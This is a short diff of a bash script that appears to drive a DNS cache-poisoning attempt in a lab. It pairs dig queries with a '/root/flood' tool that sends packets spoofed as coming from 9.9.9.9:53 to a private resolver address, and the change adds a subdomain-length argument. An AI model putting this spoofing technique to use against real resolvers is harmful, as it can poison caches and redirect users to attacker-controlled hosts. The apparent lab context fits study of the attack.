@@ -10,7 +10,8 @@ generate_columns_while() {
         queue=("${queue[@]:1}")
 
         dig @dns_server $current.eliaslundell.se &
-        /root/flood 9.9.9.9 53 172.18.0.2 33333 $current.eliaslundell.se
+        with_dot="$current."
+        /root/flood 9.9.9.9 53 172.18.0.2 33333 $current.eliaslundell.se ${#with_dot} 1
         read -p "Press enter to continue"
 
         # If length allows, append next level combinations
